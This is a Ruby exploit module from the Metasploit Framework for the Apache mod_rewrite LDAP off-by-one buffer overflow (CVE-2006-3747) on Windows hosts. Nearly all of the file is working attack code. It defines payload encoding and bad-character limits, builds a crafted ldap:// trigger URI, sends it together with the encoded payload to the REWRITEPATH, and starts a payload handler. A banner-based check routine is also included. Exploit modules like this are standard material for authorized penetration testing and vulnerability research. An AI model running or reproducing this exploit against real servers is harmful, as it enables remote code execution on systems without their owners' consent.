##
# $Id: apache_mod_rewrite_ldap.rb 8498 2010-02-15 00:48:03Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Apache module mod_rewrite LDAP protocol Buffer Overflow',
			'Description'    => %q{
				This module exploits the mod_rewrite LDAP protocol scheme handling
				flaw discovered by Mark Dowd, which produces an off-by-one overflow.
				Apache versions 1.3.29-36, 2.0.47-58, and 2.2.1-2 are vulnerable.
				This module requires REWRITEPATH to be set accurately. In addition,
				the target must have 'RewriteEngine on' configured, with a specific
				'RewriteRule' condition enabled to allow for exploitation.

				The flaw affects multiple platforms, however this module currently
				only supports Windows based installations.
			},
			'Author'         => 'patrick',
			'Version'        => '$Revision: 8498 $',
			'References'     =>
				[
					[ 'CVE', '2006-3747' ],
					[ 'OSVDB', '27588' ],
					[ 'BID', '19204' ],
					[ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2006-07/0514.html' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/3680' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/3996' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/2237' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Privileged'     => true,
			'Platform'       => ['win'], # 'linux'],
			'Payload'        =>
				{
					'Space'    => 636,
					'BadChars' => "\x00\x0a\x0d\x20",
					'EncoderType' => Msf::Encoder::Type::AlphanumUpper,
					'StackAdjustment' => -3500,
					'DisableNops'  =>  'True',
				},
			'Targets'        =>
				[
					[  'Automatic', {} ], # patrickw tested OK 20090310 win32
				],
			'DisclosureDate' => 'Jul 28 2006',
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('REWRITEPATH', [true, "The mod_rewrite URI path", "rewrite_path"]),
				], self.class)
	end


	def check
		res = send_request_raw({
			'uri'     => '/',
			'version' => '1.1',
		}, 2)

		if (res.to_s =~ /Apache/) # This could be smarter.
			return Exploit::CheckCode::Detected
		end
		return Exploit::CheckCode::Safe

	end

	def exploit

		# On Linux Apache, it is possible to overwrite EIP by
		# sending ldap://<buf> ... TODO patrickw

		trigger = '/ldap://localhost/%3fA%3fA%3fCCCCCCCCCC%3fC%3f%90'

		print_status("Sending payload.")
		send_request_raw({
				'uri'     => '/' + datastore['REWRITEPATH'] + trigger + payload.encoded,
				'version' => '1.0',
				}, 2)
		handler
	end
end